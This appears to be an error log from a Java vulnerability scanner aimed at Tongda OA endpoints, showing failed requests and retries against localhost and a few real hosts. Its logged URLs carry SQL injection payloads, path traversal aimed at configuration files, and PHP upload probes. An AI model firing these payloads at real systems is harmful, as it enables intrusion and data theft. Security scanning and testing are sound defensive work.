+2024-09-14 09:55:49  [ Thread-3:1 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:55:52  [ Thread-3:3239 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:55:55  [ Thread-3:6501 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:55:56  [ Thread-3:7513 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:56:06  [ Thread-3:16775 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:56:09  [ Thread-3:20035 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:57:01  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:57:05  [ Thread-3:3226 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:57:08  [ Thread-3:6469 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:57:09  [ Thread-3:7470 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:57:18  [ Thread-3:16690 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:58:37  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:58:40  [ Thread-3:3252 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:58:43  [ Thread-3:6511 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:58:44  [ Thread-3:7518 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:58:53  [ Thread-3:16805 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 10:17:45  [ Thread-4:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://z.zcjun.com/发生错误:java.lang.NullPointerException , retrying...1
+2024-09-14 10:17:47  [ Thread-4:1238 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://z.zcjun.com/发生错误:java.lang.NullPointerException , retrying...2
+2024-09-14 10:17:48  [ Thread-4:2493 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://z.zcjun.com/发生错误:java.lang.NullPointerException , retrying...3
+2024-09-14 10:17:49  [ Thread-4:3494 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 10:18:38  [ Thread-5:53030 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://www.toolhelper.cn/发生错误:java.lang.NullPointerException , retrying...1
+2024-09-14 10:18:40  [ Thread-5:54391 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://www.toolhelper.cn/发生错误:java.lang.NullPointerException , retrying...2
+2024-09-14 10:18:41  [ Thread-5:55757 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://www.toolhelper.cn/发生错误:java.lang.NullPointerException , retrying...3
+2024-09-14 10:18:42  [ Thread-5:56758 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 10:19:27  [ Thread-6:101901 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...1
+2024-09-14 10:19:29  [ Thread-6:103207 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...2
+2024-09-14 10:19:30  [ Thread-6:104549 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...3
+2024-09-14 10:19:31  [ Thread-6:105550 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 10:19:38  [ Thread-7:112327 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...1
+2024-09-14 10:19:39  [ Thread-7:113689 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...2
+2024-09-14 10:19:40  [ Thread-7:115006 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...3
+2024-09-14 10:19:41  [ Thread-7:116007 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:46:49  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/api/1.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/api/1.php , retrying...1
+2024-09-18 11:46:51  [ Thread-3:2586 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/api/1.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/api/1.php , retrying...2
+2024-09-18 11:46:54  [ Thread-3:5145 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/api/1.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/api/1.php , retrying...3
+2024-09-18 11:46:55  [ Thread-3:6147 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:48:16  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:48:18  [ Thread-3:1397 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:48:19  [ Thread-3:2813 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:48:20  [ Thread-3:3813 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:48:24  [ Thread-3:7704 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/document/index.php/recv/register/insert发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/document/index.php/recv/register/insert , retrying...1
+2024-09-18 11:48:25  [ Thread-3:8943 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/document/index.php/recv/register/insert发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/document/index.php/recv/register/insert , retrying...2
+2024-09-18 11:48:26  [ Thread-3:10180 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/document/index.php/recv/register/insert发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/document/index.php/recv/register/insert , retrying...3
+2024-09-18 11:48:27  [ Thread-3:11189 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:48:28  [ Thread-3:11580 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/module/appbuilder/assets/print.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/module/appbuilder/assets/print.php , retrying...1
+2024-09-18 11:48:29  [ Thread-3:12829 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/module/appbuilder/assets/print.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/module/appbuilder/assets/print.php , retrying...2
+2024-09-18 11:48:30  [ Thread-3:14070 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/module/appbuilder/assets/print.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/module/appbuilder/assets/print.php , retrying...3
+2024-09-18 11:48:31  [ Thread-3:15102 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:48:33  [ Thread-3:17191 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/mobile/api/api.ali.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/mobile/api/api.ali.php , retrying...1
+2024-09-18 11:48:35  [ Thread-3:18432 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/mobile/api/api.ali.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/mobile/api/api.ali.php , retrying...2
+2024-09-18 11:48:36  [ Thread-3:19696 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/mobile/api/api.ali.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/mobile/api/api.ali.php , retrying...3
+2024-09-18 11:48:37  [ Thread-3:20704 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:48:37  [ Thread-3:20976 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/d1a4278d?json={}&aa=<?php发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:48:38  [ Thread-3:22210 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/d1a4278d?json={}&aa=<?php发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:48:40  [ Thread-3:23462 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/d1a4278d?json={}&aa=<?php发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:48:41  [ Thread-3:24474 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:48:45  [ Thread-3:28617 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/portal/gateway/moare?a=1发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:48:46  [ Thread-3:30073 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/portal/gateway/moare?a=1发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:48:48  [ Thread-3:31508 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/portal/gateway/moare?a=1发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:48:49  [ Thread-3:32511 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:48:50  [ Thread-3:34051 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/api/1.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/api/1.php , retrying...1
+2024-09-18 11:48:53  [ Thread-3:36579 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/api/1.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/api/1.php , retrying...2
+2024-09-18 11:48:55  [ Thread-3:39107 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/api/1.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/api/1.php , retrying...3
+2024-09-18 11:48:56  [ Thread-3:40108 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:48:57  [ Thread-3:40341 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+ , retrying...1
+2024-09-18 11:48:58  [ Thread-3:41568 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+ , retrying...2
+2024-09-18 11:48:59  [ Thread-3:42819 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+ , retrying...3
+2024-09-18 11:49:00  [ Thread-3:43819 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:00  [ Thread-3:44061 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/privateUpload.php?fileName=test1.php+发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:49:02  [ Thread-3:45290 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/privateUpload.php?fileName=test1.php+发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:49:03  [ Thread-3:46538 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/privateUpload.php?fileName=test1.php+发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:49:04  [ Thread-3:47547 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:06  [ Thread-3:49427 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/inc/package/down.php?id=../../../cache/org发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:49:07  [ Thread-3:50759 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/inc/package/down.php?id=../../../cache/org发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:49:08  [ Thread-3:52068 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/inc/package/down.php?id=../../../cache/org发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:49:09  [ Thread-3:53069 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:10  [ Thread-3:53336 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config发生错误:java.io.FileNotFoundException: https://127.0.0.1/module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config , retrying...1
+2024-09-18 11:49:11  [ Thread-3:54566 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config发生错误:java.io.FileNotFoundException: https://127.0.0.1/module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config , retrying...2
+2024-09-18 11:49:12  [ Thread-3:55793 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config发生错误:java.io.FileNotFoundException: https://127.0.0.1/module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config , retrying...3
+2024-09-18 11:49:13  [ Thread-3:56794 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:13  [ Thread-3:57107 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1&tab=5发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:49:15  [ Thread-3:58386 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1&tab=5发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:49:16  [ Thread-3:59677 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1&tab=5发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:49:17  [ Thread-3:60692 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:19  [ Thread-3:62369 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/share/handle.php?_GET[module]=1%27={`%27`%202}+union%20select%20md5(1)--+发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:49:20  [ Thread-3:63611 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/share/handle.php?_GET[module]=1%27={`%27`%202}+union%20select%20md5(1)--+发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:49:21  [ Thread-3:64863 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/share/handle.php?_GET[module]=1%27={`%27`%202}+union%20select%20md5(1)--+发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:49:22  [ Thread-3:65872 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:23  [ Thread-3:66577 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/calendar/calendarlist/getcallist发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:49:24  [ Thread-3:67948 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/calendar/calendarlist/getcallist发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:49:26  [ Thread-3:69331 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/calendar/calendarlist/getcallist发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:49:27  [ Thread-3:70343 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:27  [ Thread-3:70724 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/calendar/calendarlist/getcallist发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:49:28  [ Thread-3:72109 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/calendar/calendarlist/getcallist发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:49:30  [ Thread-3:73480 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/calendar/calendarlist/getcallist发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:49:31  [ Thread-3:74493 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:32  [ Thread-3:75309 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/document/index.php/recv/register/turn发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:49:33  [ Thread-3:76552 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/document/index.php/recv/register/turn发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:49:34  [ Thread-3:77798 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/document/index.php/recv/register/turn发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:49:35  [ Thread-3:78811 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:35  [ Thread-3:79251 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/interface/auth.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:49:37  [ Thread-3:80546 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/interface/auth.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:49:38  [ Thread-3:81840 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/interface/auth.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:49:39  [ Thread-3:82851 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:39  [ Thread-3:83210 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/interface/go.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:49:41  [ Thread-3:84511 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/interface/go.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:49:42  [ Thread-3:85855 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/interface/go.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:49:43  [ Thread-3:86862 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:43  [ Thread-3:87091 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/share/handle.php?module=2&module_id=1发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 11:49:45  [ Thread-3:88332 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/share/handle.php?module=2&module_id=1发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 11:49:46  [ Thread-3:89566 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/share/handle.php?module=2&module_id=1发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 11:49:47  [ Thread-3:90572 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 11:49:53  [ Thread-3:96331 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-18 11:49:56  [ Thread-3:99578 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-18 11:49:59  [ Thread-3:102838 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-18 11:50:00  [ Thread-3:103850 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:12:22  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 14:12:24  [ Thread-3:1420 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 14:12:25  [ Thread-3:2760 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://baiyingzc.lenovo.com/发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 14:12:26  [ Thread-3:3770 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:12:30  [ Thread-3:7795 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/document/index.php/recv/register/insert发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/document/index.php/recv/register/insert , retrying...1
+2024-09-18 14:12:31  [ Thread-3:9072 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/document/index.php/recv/register/insert发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/document/index.php/recv/register/insert , retrying...2
